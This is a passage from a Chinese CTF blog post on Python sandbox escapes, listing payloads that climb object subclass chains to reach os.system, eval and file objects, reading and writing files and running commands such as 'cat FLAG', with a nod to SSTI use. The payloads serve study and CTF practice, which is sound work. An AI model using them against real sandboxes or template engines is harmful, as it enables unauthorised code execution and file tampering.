+<p>因为<code>__builtins__</code>返回的是一个字典。通过has_key的方法，可以发现我们想要的是否存在</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]()._module.__builtins__.has_key(<span class="string">'reload'</span>)</span><br><span class="line"><span class="keyword">True</span></span><br></pre></td></tr></table></figure>
+<p>所以在出题的时候我们可以把该模块下的函数删掉</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">'__import__'</span>]</span><br></pre></td></tr></table></figure>
+<h2 id="python-代码执行函数与新特性以及f修饰符"><a href="#python-代码执行函数与新特性以及f修饰符" class="headerlink" title="python 代码执行函数与新特性以及f修饰符"></a>python 代码执行函数与新特性以及f修饰符</h2><p>下面内容摘取自<code>https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html</code>以及<code>http://shaobaobaoer.cn/archives/656/python-sandbox-escape</code></p>
+<p>在python中常见的代码执行函数如下所示</p>
+<p>（1）timeit</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">"__import__('os').system('dir')"</span>,number=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<p>（2）exec 和eval 比较经典了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(<span class="string">'__import__("os").system("dir")'</span>)</span><br></pre></td></tr></table></figure>
+<p>（3）platform</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">print</span> platform.popen(<span class="string">'dir'</span>).read()</span><br></pre></td></tr></table></figure>
+<p>  (4) getattr() 和 getattribute()</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = [x <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'ca'</span>+<span class="string">'tch_warnings'</span>][<span class="number">0</span>].__init__</span><br><span class="line">x.__getattribute__(<span class="string">"func_global"</span>+<span class="string">"s"</span>)[<span class="string">'linecache'</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'sy'</span>+<span class="string">'stem'</span>](<span class="string">'l'</span>+<span class="string">'s'</span>)</span><br></pre></td></tr></table></figure>
+<p>​    (5)f修饰符</p>
+<p>用f修饰的字符串将可以执行代码, 但只有python版本在 3.6.0朝上才有这个方法</p>
+<p><img src="https://s2.ax1x.com/2019/02/08/kNEfSK.png" alt="kNEfSK.png"></p>
+<p>这种代码执行方法和PHP中的<code>&lt;?php &quot;${@phpinfo()}&quot;; ?&gt;</code>很类似，这是Python中很少有的几个能够直接将字符串转变成的代码的方式</p>
+<p>执行代码总结</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用file()函数读取文件：（写类似）</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'./test.py'</span>).read()</span><br><span class="line"><span class="comment"># 执行系统命令：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].os.system(<span class="string">'ls'</span>)</span><br><span class="line"><span class="comment"># 执行系统命令：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("ls")'</span>)</span><br><span class="line"><span class="comment"># 重新载入__builtins__：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">"os"</span>).system(<span class="string">"ls"</span>)</span><br><span class="line"><span class="comment">#读文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">r'C:\1.php'</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment">#写文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/var/www/html/input'</span>, <span class="string">'w'</span>).write(<span class="string">'123'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行任意命令</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("ls  /var/www/html").read()'</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 __getattibute__ 方法</span></span><br><span class="line"></span><br><span class="line">x = [x <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'ca'</span>+<span class="string">'tch_warnings'</span>][<span class="number">0</span>].__init__</span><br><span class="line">x.__getattribute__(<span class="string">"func_global"</span>+<span class="string">"s"</span>)[<span class="string">'linecache'</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'sy'</span>+<span class="string">'stem'</span>](<span class="string">'l'</span>+<span class="string">'s'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### 上述命令需要通过哦 exec 或者别的命令执行函数执行</span></span><br><span class="line"></span><br><span class="line">python3</span><br><span class="line">py2 [<span class="number">58</span>] &lt;<span class="class"><span class="keyword">class</span> '<span class="title">warnings</span>.<span class="title">catch_warnings</span>'&gt; 对应 <span class="title">py3</span> [157]</span></span><br><span class="line"><span class="class"><span class="params">()</span>.<span class="title">__class__</span>.<span class="title">__bases__</span>[0].<span class="title">__subclasses__</span><span class="params">()</span>[157]<span class="params">()</span>.<span class="title">_module</span>.<span class="title">__builtins__</span>['<span class="title">__import__</span>']<span class="params">(<span class="string">"os"</span>)</span>.<span class="title">system</span><span class="params">(<span class="string">"ls"</span>)</span></span></span><br><span class="line"><span class="class">推荐的另外一个类</span></span><br><span class="line"><span class="class">''.<span class="title">__class__</span>.<span class="title">__mro__</span>[1].<span class="title">__subclasses__</span><span class="params">()</span>[104].<span class="title">__init__</span>.<span class="title">__globals__</span>["<span class="title">sys</span>"].<span class="title">modules</span>["<span class="title">os</span>"].<span class="title">system</span><span class="params">(<span class="string">"cat FLAG"</span>)</span></span></span><br></pre></td></tr></table></figure>
+<p>就先总结到这里吧，感觉这个东西联系起SSTI还是可以起很大的作用的。</p>
+<p>参考：</p>
+<p><a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html</a></p>
+<p><a href="https://xz.aliyun.com/t/2308#toc-12" target="_blank" rel="noopener">https://xz.aliyun.com/t/2308#toc-12</a></p>
+<p><a href="https://www.anquanke.com/post/id/85571" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85571</a></p>
+<p><a href="http://shaobaobaoer.cn/archives/656/python-sandbox-escape" target="_blank" rel="noopener">http://shaobaobaoer.cn/archives/656/python-sandbox-escape</a></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/python-sandbox-bypass.html">Python沙盒绕过</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">0verWatch</a></p>
+        <p><span>发布时间:</span>2019-02-04, 16:34:04</p>
+        <p><span>最后更新:</span>2019-02-08, 16:48:01</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/python-sandbox-bypass.html" title="Python沙盒绕过">0verwatch.top/python-sandbox-bypass.html</a>
+            <span class="copy-path" data-clipboard-text="原文: 0verwatch.top/python-sandbox-bypass.html　　作者: 0verWatch" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/anheng-1mongth.html">
+                    安恒一月赛做题记录
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/Dockerfile-writing.html">
+                    Dockerfile编写
+                </a>
+            </div>
+        
+    </nav>
+
+  
+  
+   
+    <div style="padding: 0; margin: 20px auto; width: 90%; text-align: center;">
+      <br>
+      <div>听说，打赏我的人最后都成了大佬。</div>
+      <br>
+      <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+        <div class="btn btn-pay">打赏支持</div>
+      </button>
+      <br>
+      <br>
+      <div id="QR" style="display: none;">
+        
+          <div id="wechat" style="display: inline-block;">
+            <img id="wechat_qr" src="/img/wechatpay.jpg" alt="0verWatch WeChat Pay"/>
+            <p>微信打赏</p>
+          </div>
+        
+        
+          <div id="alipay" style="display: inline-block">
+            <img id="alipay_qr" src="/img/alipay.jpg" alt="0verWatch Alipay"/>
+            <p>支付宝打赏</p>
+          </div>
+        
+        <br>
+        <br>
+      </div>
+    </div>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#基础"><span class="toc-number">1.</span> <span class="toc-text">基础</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dir方法"><span class="toc-number">2.</span> <span class="toc-text">dir方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#内联模块"><span class="toc-number">3.</span> <span class="toc-text">内联模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#注意："><span class="toc-number">4.</span> <span class="toc-text">注意：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#弄一个沙盒环境"><span class="toc-number">5.</span> <span class="toc-text">弄一个沙盒环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#一道题目"><span class="toc-number">6.</span> <span class="toc-text">一道题目</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#用file类去读取文件"><span class="toc-number">6.1.</span> <span class="toc-text">用file类去读取文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用内置函数执行命令"><span class="toc-number">6.2.</span> <span class="toc-text">利用内置函数执行命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python-代码执行函数与新特性以及f修饰符"><span class="toc-number"></span> <span class="toc-text">python 代码执行函数与新特性以及f修饰符</span></a>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+
+    
+        <div class="addthis_sharing_toolbox"></div>
+    
+</div>
+
+
+
+
+
+
+
+              
+        <section class="livere" id="comments">
+    <!-- 来必力City版安装代码 -->
+    <div id="lv-container" data-id="city" data-uid="MTAyMC80MDk1Ny8xNzQ4Mg==">
+    <script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+       if (typeof LivereTower === 'function') { return; }
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+       e.parentNode.insertBefore(j, e);
+       })(document, 'script');
+    </script>
+    <noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+    <!-- City版安装代码已完成 -->
+</section>。 
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/anheng-1mongth.html" title="上一篇: 安恒一月赛做题记录">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/Dockerfile-writing.html" title="下一篇: Dockerfile编写">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/upload-labs-wp.html">upload-labs记录</a></li><li class="post-list-item"><a class="post-list-link" href="/anheng-1mongth.html">安恒一月赛做题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/python-sandbox-bypass.html">Python沙盒绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/Dockerfile-writing.html">Dockerfile编写</a></li><li class="post-list-item"><a class="post-list-link" href="/RC4-python.html">RC4的原理及python实现</a></li><li class="post-list-item"><a class="post-list-link" href="/A5-python.html">A5的原理及python实现</a></li><li class="post-list-item"><a class="post-list-link" href="/swpuctf-2018.html">swpuctf赛后复现</a></li><li class="post-list-item"><a class="post-list-link" href="/anheng-12month.html">安恒12月赛Web题解</a></li><li class="post-list-item"><a class="post-list-link" href="/CUMT-month-race.html">CUMT第一轮双月赛Web题解</a></li><li class="post-list-item"><a class="post-list-link" href="/anheng-11month.html">安恒11月赛Web题目复现</a></li><li class="post-list-item"><a class="post-list-link" href="/anheng-10month.html">安恒10月赛Web题目复现</a></li><li class="post-list-item"><a class="post-list-link" href="/algorithm-review.html">算法上机考试复习</a></li><li class="post-list-item"><a class="post-list-link" href="/huwang-game.html">护网杯部分题目题解</a></li><li class="post-list-item"><a class="post-list-link" href="/CUMT-CTF-Platform.html">CUMT平台的部分题解</a></li><li class="post-list-item"><a class="post-list-link" href="/anheng-9month.html">安恒9月部分赛题复现</a></li><li class="post-list-item"><a class="post-list-link" href="/hitcon2017-babyfirstv2.html">Hitcon2017 babyfirst-revenge v2复现</a></li><li class="post-list-item"><a class="post-list-link" href="/hitcon2015-babyfirst.html">Hitcon2015 babyfirst复现</a></li><li class="post-list-item"><a class="post-list-link" href="/hitcon2017-babyfirst.html">Hitcon2017 babyfirst-revenge复现</a></li><li class="post-list-item"><a class="post-list-link" href="/liuliangfenxi-5-5.html">铁三2018.5.5数据分析</a></li><li class="post-list-item"><a class="post-list-link" href="/anheng-8month-part1.html">安恒8月应急响应题目回顾</a></li><li class="post-list-item"><a class="post-list-link" href="/sqli-labs-training-4.html">sqli-labs实战记录(四)</a></li><li class="post-list-item"><a class="post-list-link" href="/sqli-labs-training-3.html">sqli-labs实战记录(三)</a></li><li class="post-list-item"><a class="post-list-link" href="/sqli-labs-training-2.html">sqli-labs实战记录(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/sqli-labs-training-1.html">sqli-labs实战记录(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/bin-search-sql.html">二分查找在sql盲注里面的应用</a></li><li class="post-list-item"><a class="post-list-link" href="/Solve-Me-wp.html">Solve Me解题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/sql-inject-protect.html">浅谈SQL注入防御手段</a></li><li class="post-list-item"><a class="post-list-link" href="/sqlmap-usage.html">Sqlmap 使用方法小结</a></li><li class="post-list-item"><a class="post-list-link" href="/Linux-FW.html">Linux防火墙学习</a></li><li class="post-list-item"><a class="post-list-link" href="/Mysql-security-1.html">Mysql安全配置</a></li><li class="post-list-item"><a class="post-list-link" href="/pentest-1.html">记录一次模拟渗透</a></li><li class="post-list-item"><a class="post-list-link" href="/comp-net-2.html">计网实验笔记(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/comp-net-1.html">计网实验笔记(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/weiji-exam.html">微机实验考试</a></li><li class="post-list-item"><a class="post-list-link" href="/weiji-experiment.html">微机实验记录</a></li><li class="post-list-item"><a class="post-list-link" href="/anheng-6month.html">安恒6月赛部分做题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/python-DataStruct-2.html">数据结构复习二 双向链表(python实现)</a></li><li class="post-list-item"><a class="post-list-link" href="/python-DataStruct-1.html">数据结构复习一 单链表(python实现)</a></li><li class="post-list-item"><a class="post-list-link" href="/writing-1.html">两年</a></li><li class="post-list-item"><a class="post-list-link" href="/Yii-probleam.html">编写Yii框架项目时出现的问题</a></li><li class="post-list-item"><a class="post-list-link" href="/susctf2018-wp.html">SUSCTF 2018 做题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/Docker-CTFd-building.html">Docker练习及在CTFd平台上放题目</a></li><li class="post-list-item"><a class="post-list-link" href="/CTFd-building.html">CTFd平台搭建记录</a></li><li class="post-list-item"><a class="post-list-link" href="/Docker-learning.html">Docker学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/ISCC-2018-wp.html">ISCC 2018做题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/anheng-5month.html">安恒5月赛web题目做题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/cumt-2018-final.html">cumt2018校赛部分write up</a></li><li class="post-list-item"><a class="post-list-link" href="/whalectf-web2.html">WhaleCTF第二期打卡的web题</a></li><li class="post-list-item"><a class="post-list-link" href="/git-learning.html">Git学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/PHP-Yii.html">PHP_Yii框架学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/whalectf-web1.html">WhaleCTF第一期打卡的几个web题目</a></li><li class="post-list-item"><a class="post-list-link" href="/shiyanba1-wp.html">实验吧 忘记密码了wp</a></li><li class="post-list-item"><a class="post-list-link" href="/phpcheck2.html">记一道代码审计题目</a></li><li class="post-list-item"><a class="post-list-link" href="/CTF-python.html">小结一波CTF里面可能用到的脚本</a></li><li class="post-list-item"><a class="post-list-link" href="/Ubantu-Web.html">Ubantu下部署LAMP以及复现一道CTF题目</a></li><li class="post-list-item"><a class="post-list-link" href="/cumt-php-fanxuliehua.html">浅析cumt平台上的一道反序列化题目</a></li><li class="post-list-item"><a class="post-list-link" href="/RaceConditionsSummary.html">简单小结一下Web条件竞争的题目</a></li><li class="post-list-item"><a class="post-list-link" href="/hash-length-attack.html">记录一下Hash长度扩展攻击的几个题目</a></li><li class="post-list-item"><a class="post-list-link" href="/moctf-web.html">简单小结一下moctf的三道web题</a></li><li class="post-list-item"><a class="post-list-link" href="/backup-blog-again.html">重装系统后快速恢复hexo博客(保留了原有的博客文件夹)</a></li><li class="post-list-item"><a class="post-list-link" href="/RSA-SimpleLearn.html">大致了解一下RSA以及出题套路</a></li><li class="post-list-item"><a class="post-list-link" href="/CRC32-Brute.html">CRC32爆破小结</a></li><li class="post-list-item"><a class="post-list-link" href="/Linux-learn.html">熟悉Linux命令~~~</a></li><li class="post-list-item"><a class="post-list-link" href="/bugku-php-check.html">bugku 代码审计 write up</a></li><li class="post-list-item"><a class="post-list-link" href="/bugku-Web-write-up.html">bugku Web write up</a></li><li class="post-list-item"><a class="post-list-link" href="/bugku-Misc.html">bugku Misc write up</a></li><li class="post-list-item"><a class="post-list-link" href="/bugku-Crypto.html">bugku Crypto write up</a></li><li class="post-list-item"><a class="post-list-link" href="/bugku-social-wp.html">bugku Social write up</a></li><li class="post-list-item"><a class="post-list-link" href="/zipfalse.html">zip伪加密[转载]</a></li><li class="post-list-item"><a class="post-list-link" href="/php-mysql-content.html">php+mysql留言板实现代码分享</a></li><li class="post-list-item"><a class="post-list-link" href="/sql-Summary.html">对数据库学习的大致总结</a></li><li class="post-list-item"><a class="post-list-link" href="/php summary.html">php留言板编写总结</a></li><li class="post-list-item"><a class="post-list-link" href="/Csharp-work4.html">程序设计课 C#的作业报告四</a></li><li class="post-list-item"><a class="post-list-link" href="/Csharp-work3.html">程序设计课 C#的作业报告三</a></li><li class="post-list-item"><a class="post-list-link" href="/Csharp-work2.html">程序设计课 C#作业报告二</a></li><li class="post-list-item"><a class="post-list-link" href="/Csharp-work1.html">程序设计课 C#的作业报告一</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2017-2019 0verWatch
+
+            </div>
+            <div class="footer-right">
+                Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> 
+                <span>|  Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a></span>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+
+                
+
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-119588656-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        $("a[target=_blank]").removeAttr("target");
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
